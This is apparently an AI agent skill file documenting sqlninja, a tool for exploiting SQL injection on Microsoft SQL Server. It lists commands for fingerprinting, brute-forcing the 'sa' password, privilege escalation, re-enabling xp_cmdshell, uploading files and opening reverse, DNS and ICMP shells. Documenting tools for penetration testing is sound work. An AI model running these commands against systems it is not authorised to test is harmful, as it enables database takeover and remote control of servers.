---
name: sqlninja
description: Exploit SQL injection vulnerabilities on Microsoft SQL Server to gain administrative access and OS-level control. Use when performing database penetration testing, escalating privileges from SQLi to sysadmin, uploading files via debug scripts, or establishing reverse/direct shells through a vulnerable MS-SQL instance.
---

# sqlninja

## Overview
sqlninja is a specialized tool designed to exploit SQL Injection vulnerabilities on web applications that use Microsoft SQL Server as a backend. Its primary focus is on the post-exploitation phase, aiming to provide remote shell access and full system takeover rather than just data extraction. Category: Web Application Testing / Exploitation.

## Installation (if not already installed)
Assume sqlninja is already installed. If the command is missing:

```bash
sudo apt install sqlninja
```

Dependencies: libio-socket-ip-perl, libnet-dns-perl, libnet-pcap-perl, libnet-rawip-perl, libnetpacket-perl, perl.

## Common Workflows

### Connection Test
Verify if the injection point defined in the configuration file is working correctly.
```bash
sqlninja -m t -f sqlninja.conf
```

### Fingerprinting the Environment
Identify the database user, check if `xp_cmdshell` is enabled, and gather OS information.
```bash
sqlninja -m f -f sqlninja.conf
```

### Brute-forcing the 'sa' Password
Attempt to crack the system administrator password using a wordlist.
```bash
sqlninja -m b -f sqlninja.conf -w /usr/share/wordlists/rockyou.txt
```

### Obtaining a Reverse Shell
Attempt to establish a reverse shell from the target back to the attacker machine.
```bash
sqlninja -m r -f sqlninja.conf
```

## Complete Command Reference

```
sqlninja -m <mode> [options]
```

### Required Options

| Flag | Description |
|------|-------------|
| `-m <mode>` | **Execution Mode.** Available modes: |
| | `t` / `test` : Test whether the injection is working |
| | `f` / `fingerprint` : Fingerprint user, xp_cmdshell, and environment |
| | `b` / `bruteforce` : Bruteforce the 'sa' account |
| | `e` / `escalation` : Add current user to sysadmin server role |
| | `x` / `resurrectxp` : Attempt to recreate/re-enable `xp_cmdshell` |
| | `u` / `upload` : Upload a .scr file (via debug.exe) |
| | `s` / `dirshell` : Start a direct shell |
| | `k` / `backscan` : Look for an open outbound port for shells |
| | `r` / `revshell` : Start a reverse shell |
| | `d` / `dnstunnel` : Attempt a DNS tunneled shell |
| | `i` / `icmpshell` : Start a reverse ICMP shell |
| | `c` / `sqlcmd` : Issue a 'blind' OS command |
| | `m` / `metasploit` : Wrapper for Metasploit stagers |

### Additional Options

| Flag | Description |
|------|-------------|
| `-f <file>` | Path to the configuration file (default: `sqlninja.conf`) |
| `-p <password>` | Specify the 'sa' password (if known) |
| `-w <wordlist>` | Wordlist to use in `bruteforce` mode (dictionary method) |
| `-g` | Generate debug script and exit (only valid in `upload` mode) |
| `-v` | Enable verbose output |
| `-d <mode>` | **Debug Mode.** Options: |
| | `1` : Print each injected command |
| | `2` : Print each raw HTTP request |
| | `3` : Print each raw HTTP response |
| | `all` : Enable all of the above |
| `--` | Stop processing of options |

## Notes
- A configuration file (`sqlninja.conf`) is required for most operations to define the target URL, injection points, and HTTP headers.
- The tool is highly effective against older MS-SQL installations but may require `xp_cmdshell` to be enabled or "resurrected" for OS-level commands.
- Use the `-d all` flag if the injection is failing to see exactly how the payload is being formatted and sent.